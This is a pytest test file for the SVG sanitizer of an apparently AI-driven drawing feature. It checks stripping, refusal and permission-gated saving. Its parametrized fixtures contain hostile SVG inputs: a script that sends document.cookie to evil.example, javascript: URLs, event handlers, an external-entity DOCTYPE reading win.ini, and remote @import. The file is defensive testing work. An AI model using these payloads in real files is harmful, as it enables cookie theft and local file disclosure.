"""Drawings (E2): SVG a model writes, cleaned before anyone sees or saves it.

What is tested is that a drawing keeps what draws and loses what runs, fetches,
embeds or animates, whoever wrote it; that what cannot be made safe is refused
with a reason a model can act on; and that saving one is `files.write`, a new
file, and seen by the person first. Rendering needs Qt's interface running, so
it is tested in a process of its own, as the QML tests are.
"""

from __future__ import annotations

import subprocess
import sys
import textwrap
import xml.etree.ElementTree as ElementTree
from pathlib import Path

import pytest

from akira.core.agents.roles import ILLUSTRATOR
from akira.core.making import svg
from akira.core.making.svg import DrawingError, clean, drawings_in
from akira.core.permissions import AuditLog, Policy, SecretStore
from akira.core.tools import Asking, ToolContext, default_registry

NS = {"s": svg.SVG_NS}
XLINK = f"{{{svg.XLINK_NS}}}href"

FOX = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 80">
  <defs><linearGradient id="fur"><stop offset="0" stop-color="#e8702a"/>
    <stop offset="1" stop-color="#b3471a"/></linearGradient></defs>
  <path d="M10 70 L60 10 L110 70 Z" fill="url(#fur)" stroke="#402010" stroke-width="2"/>
  <circle cx="45" cy="45" r="4"/><circle cx="75" cy="45" r="4"/>
  <text x="60" y="78" text-anchor="middle" font-size="8">fox</text>
</svg>"""


def parsed(drawing):
    return ElementTree.fromstring(drawing.svg)


# -- what is kept --------------------------------------------------------------------------------


def test_a_drawing_keeps_everything_that_draws():
    drawing = clean(FOX)
    assert drawing.removed == () and (drawing.width, drawing.height) == (120, 80)
    root = parsed(drawing)
    assert root.tag == f"{{{svg.SVG_NS}}}svg" and root.get("viewBox") == "0 0 120 80"
    assert root.find("s:path", NS).get("fill") == "url(#fur)"
    assert len(root.findall("s:circle", NS)) == 2
    assert root.find("s:text", NS).text == "fox"
    assert root.find("s:defs/s:linearGradient/s:stop", NS).get("stop-color") == "#e8702a"


def test_a_drawing_without_a_namespace_is_given_one():
    drawing = clean('<svg viewBox="0 0 10 10"><rect width="5" height="5"/></svg>')
    assert parsed(drawing).find("s:rect", NS) is not None


def test_width_and_height_do_when_there_is_no_viewbox():
    assert (clean('<svg width="64px" height="32"><rect width="1" height="1"/></svg>').width,
            clean('<svg width="64px" height="32"/>').height) == (64, 32)


def test_a_link_inside_the_drawing_is_kept():
    drawing = clean('<svg xmlns="http://www.w3.org/2000/svg" '
                    'xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10">'
                    '<defs><circle id="dot" r="1"/></defs>'
                    '<use xlink:href="#dot" x="5" y="5"/><use href="#dot" x="2" y="2"/></svg>')
    uses = parsed(drawing).findall("s:use", NS)
    assert [use.get(XLINK) for use in uses] == ["#dot", "#dot"] and drawing.removed == ()


# -- what is not ---------------------------------------------------------------------------------


@pytest.mark.parametrize("inside, gone", [
    ("<script>fetch('https://evil.example/?'+document.cookie)</script>", "script"),
    ("<foreignObject><iframe src='https://evil.example'/></foreignObject>", "foreignObject"),
    ("<image href='https://evil.example/pixel.png' width='1' height='1'/>", "image"),
    ("<rect width='1' height='1'><set attributeName='href' to='javascript:x'/></rect>", "set"),
    ("<animate attributeName='fill' to='red'/>", "animate"),
    ("<rect width='1' height='1' onclick='steal()'/>", "onclick"),
    ("<rect width='1' height='1' onload='steal()'/>", "onload"),
    ("<use href='https://evil.example/sprites.svg#icon'/>", "a link out of the drawing"),
    ("<use href='file:///C:/Users/secret.svg#x'/>", "a link out of the drawing"),
    ("<rect width='1' height='1' fill='url(https://evil.example/p.svg#g)'/>",
     "fill that reaches out of the drawing"),
    ("<rect width='1' height='1' style='fill:url(&quot;https://evil.example&quot;)'/>",
     "style that reaches out of the drawing"),
    ("<rect width='1' height='1' fill='url(data:image/svg+xml;base64,AAAA)'/>",
     "fill that reaches out of the drawing"),
    ("<style>@import url(https://evil.example/a.css);</style>",
     "a style that reaches out of the drawing"),
    ("<style>rect { fill: url(https://evil.example/x) }</style>",
     "a style that reaches out of the drawing"),
    ("<rect xmlns:inkscape='http://www.inkscape.org/namespaces/inkscape' "
     "inkscape:label='x' width='1' height='1'/>", "label"),
])
def test_what_runs_fetches_embeds_or_animates_is_left_out(inside, gone):
    drawing = clean(f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">{inside}</svg>')
    assert gone in drawing.removed
    text = drawing.svg.lower()
    for trace in ("script", "evil.example", "javascript", "onclick", "onload", "iframe",
                  "file:", "data:", "@import", "inkscape"):
        assert trace not in text, trace


def test_a_style_that_stays_inside_the_drawing_is_kept():
    drawing = clean('<svg viewBox="0 0 10 10"><style>.a { fill: url(#g); stroke: red }</style>'
                    '<rect class="a" width="5" height="5" style="opacity:0.5"/></svg>')
    root = parsed(drawing)
    assert "url(#g)" in root.find("s:style", NS).text
    assert root.find("s:rect", NS).get("style") == "opacity:0.5" and drawing.removed == ()


def test_a_link_around_shapes_keeps_the_shapes():
    drawing = clean('<svg viewBox="0 0 10 10"><a href="https://evil.example" target="_blank">'
                    '<rect width="5" height="5" fill="blue"/></a></svg>')
    root = parsed(drawing)
    assert root.find("s:g/s:rect", NS).get("fill") == "blue"
    assert "evil.example" not in drawing.svg and "a link (what it held is kept)" in drawing.removed


@pytest.mark.parametrize("text, why", [
    pytest.param("", "empty", id="empty"),
    pytest.param("just words", "not well-formed", id="words"),
    pytest.param("<html><body/></html>", "this is <html>", id="html"),
    pytest.param('<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa">]><svg viewBox="0 0 1 1">&a;</svg>',
                 "DOCTYPE", id="entity"),
    pytest.param('<?xml version="1.0"?><!DOCTYPE x SYSTEM "file:///C:/Windows/win.ini"><svg/>',
                 "DOCTYPE", id="external"),
    pytest.param('<svg><rect width="1" height="1"/></svg>', "no size", id="no-size"),
    pytest.param('<svg viewBox="0 0 1 1">' + "<g>" * (svg.MAX_DEPTH + 2)
                 + "</g>" * (svg.MAX_DEPTH + 2) + "</svg>", "more simply", id="deep"),
    pytest.param("<svg viewBox='0 0 1 1'>" + "<rect/>" * (svg.MAX_ELEMENTS + 1) + "</svg>",
                 "more simply", id="many"),
    pytest.param("<svg>" + " " * svg.MAX_CHARACTERS + "</svg>", "longer than", id="long"),
])
def test_what_cannot_be_made_a_drawing_is_refused_with_the_reason(text, why):
    with pytest.raises(DrawingError, match=why):
        clean(text)


def test_the_drawings_in_a_reply_are_found():
    reply = f"Here it is:\n\n```svg\n{FOX}\n```\n\nAnd a second:\n```xml\n<svg viewBox='0 0 1 1'/>\n```"
    assert [drawing.strip()[:4] for drawing in drawings_in(reply)] == ["<svg", "<svg"]
    assert len(drawings_in("inline <svg viewBox='0 0 1 1'></svg> too")) == 1
    assert drawings_in("```python\nprint('<svg>')\n```") == []


# -- saving one ----------------------------------------------------------------------------------


def context(tmp_path, *writable, answer=True):
    policy = Policy()
    if writable:
        policy.grant("files.write", tuple(str(path) for path in writable))
    asked = []
    ctx = ToolContext(policy=policy, audit=AuditLog(tmp_path / "audit.jsonl"),
                      secrets=SecretStore(tmp_path / "secrets"), actor="illustrator")
    ctx.confirm = lambda summary: asked.append(summary) or answer
    return ctx, asked


def save(ctx, path, drawing=FOX):
    return default_registry().invoke("save_drawing", {"path": str(path), "svg": drawing}, ctx)


def test_nothing_is_saved_without_files_write_for_the_place(tmp_path):
    ctx, asked = context(tmp_path)
    refused = save(ctx, tmp_path / "fox.svg")
    assert not refused.ok and "Not permitted" in refused.content
    assert asked == [] and not (tmp_path / "fox.svg").exists()


def test_the_person_is_asked_and_only_the_cleaned_drawing_is_written(tmp_path):
    out = tmp_path / "art"
    out.mkdir()
    ctx, asked = context(tmp_path, out)
    sneaky = FOX.replace("</svg>", "<script>alert(1)</script></svg>")
    result = save(ctx, out / "fox.svg", sneaky)
    assert result.ok, result.content
    [question] = asked
    assert isinstance(question, Asking) and "Save the drawing as a new file" in question
    assert "script" in question and "Left out" in result.content
    written = (out / "fox.svg").read_text(encoding="utf-8")
    assert "<script" not in written and ElementTree.fromstring(written).tag.endswith("svg")


def test_a_refusal_writes_nothing(tmp_path):
    ctx, asked = context(tmp_path, tmp_path, answer=False)
    assert not save(ctx, tmp_path / "fox.svg").ok
    assert len(asked) == 1 and not (tmp_path / "fox.svg").exists()


@pytest.mark.parametrize("name, drawing, why", [
    ("fox.txt", FOX, "saved as a .svg"),
    ("fox.svg", "<svg><rect/></svg>", "no size"),
    ("fox.svg", "not a drawing", "not well-formed"),
])
def test_what_cannot_be_saved_is_refused_before_anyone_is_asked(tmp_path, name, drawing, why):
    ctx, asked = context(tmp_path, tmp_path)
    result = save(ctx, tmp_path / name, drawing)
    assert not result.ok and why in result.content and asked == []


def test_a_file_already_there_is_never_replaced(tmp_path):
    (tmp_path / "fox.svg").write_text("mine", encoding="utf-8")
    ctx, asked = context(tmp_path, tmp_path)
    result = save(ctx, tmp_path / "fox.svg")
    assert not result.ok and "already exists" in result.content and asked == []
    assert (tmp_path / "fox.svg").read_text(encoding="utf-8") == "mine"


def test_the_illustrator_draws_and_saves_and_nothing_more():
    assert set(ILLUSTRATOR.tools) == {"save_drawing", "list_directory"}
    assert default_registry().get("save_drawing").reversible is False


# -- seeing one ----------------------------------------------------------------------------------


def test_without_the_interface_there_is_no_picture_and_no_crash():
    assert svg.picture(clean(FOX)) is None or isinstance(svg.picture(clean(FOX)), bytes)


def test_a_drawing_is_rendered_with_the_interface_running(tmp_path):
    script = textwrap.dedent(f"""
        import sys
        sys.path.insert(0, {str(Path(__file__).resolve().parents[1])!r})
        from PySide6.QtGui import QGuiApplication, QImage
        app = QGuiApplication([])
        from akira.core.making.svg import clean, picture
        drawing = clean('<svg viewBox="0 0 20 10"><rect width="20" height="10" fill="#00ff00"/>'
                        '<text x="2" y="8" font-size="6">hi</text></svg>')
        png = picture(drawing, 200)
        jpg = picture(drawing, 100, "JPG")
        image = QImage.fromData(png)
        print(png[:8] == b"\\x89PNG\\r\\n\\x1a\\n", jpg[:3] == b"\\xff\\xd8\\xff",
              image.width(), image.height(), image.pixelColor(199, 0).name())
    """)
    done = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True,
                          timeout=60, env={**__import__("os").environ,
                                           "QT_QPA_PLATFORM": "offscreen"})
    assert done.returncode == 0, done.stderr
    assert done.stdout.split() == ["True", "True", "200", "100", "#00ff00"]


# -- the chat's side -----------------------------------------------------------------------------


def test_the_chat_finds_checks_and_saves_a_drawing_where_the_person_chose(tmp_path):
    pytest.importorskip("PySide6.QtCore")
    from PySide6.QtCore import QUrl

    from akira.ui.bridge.drawing import DrawingBridge

    bridge = DrawingBridge()
    reply = f"A fox:\n```svg\n{FOX.replace('</svg>', '<script>x()</script></svg>')}\n```"
    [found] = bridge.drawingsIn(reply)
    checked = bridge.check(found)
    assert checked["usable"] and checked["removed"] == ["script"] and "script" in checked["note"]
    assert bridge.check("<svg/>")["usable"] is False
    target = tmp_path / "fox.svg"
    assert bridge.save(found, QUrl.fromLocalFile(str(target)).toString()) == ""
    assert "<script" not in target.read_text(encoding="utf-8")
    assert "saved as a .svg" in bridge.save(found, str(tmp_path / "fox.exe")).replace(
        "Save a drawing as", "saved as")
    assert not (tmp_path / "fox.exe").exists()


def test_the_chat_shows_a_drawing_as_a_picture(tmp_path):
    script = textwrap.dedent(f"""
        import base64, sys
        sys.path.insert(0, {str(Path(__file__).resolve().parents[1])!r})
        from PySide6.QtGui import QGuiApplication
        app = QGuiApplication([])
        from akira.ui.bridge.drawing import DrawingBridge
        bridge = DrawingBridge()
        address = bridge.picture('<svg viewBox="0 0 2 1"><rect width="2" height="1"/></svg>', 64)
        print(address.startswith("data:image/png;base64,"),
              base64.b64decode(address.split(",", 1)[1])[1:4] == b"PNG",
              bridge.picture("<svg/>", 64) == "",
              bridge.save('<svg viewBox="0 0 2 1"/>', {str(tmp_path / 'p.png')!r}) == "")
    """)
    done = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True,
                          timeout=60, env={**__import__("os").environ,
                                           "QT_QPA_PLATFORM": "offscreen"})
    assert done.returncode == 0, done.stderr
    assert done.stdout.split() == ["True", "True", "True", "True"]
    assert (tmp_path / "p.png").read_bytes()[:4] == b"\x89PNG"
